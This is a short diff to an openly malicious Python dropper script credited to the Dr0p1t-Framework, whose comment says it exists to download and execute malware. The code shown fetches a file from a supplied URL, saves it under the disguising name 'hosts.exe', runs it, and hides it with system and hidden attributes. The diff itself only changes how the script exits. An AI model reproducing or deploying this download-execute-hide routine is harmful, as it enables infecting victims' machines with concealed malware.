@@ -1,7 +1,8 @@
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 #This script aims to download and execute your malware (¯\_(ツ)_/¯)
 #Start
-from os import popen,_exit
+from os import popen
+import sys
 from platform import architecture
 from urllib import *
 
@@ -13,8 +14,9 @@ def fire_things_up(url,arch="No"):
             x = urlretrieve(url,"hosts.exe")
             xx = popen("hosts.exe")
             xxx = popen("attrib +s +h hosts.exe")
-            _exit()
+            sys.exit(0)
     else:
         x = urlretrieve(url,"hosts.exe")
         xx = popen("hosts.exe")
         xxx = popen("attrib +s +h hosts.exe") #hiding the file
+        sys.exit(0)
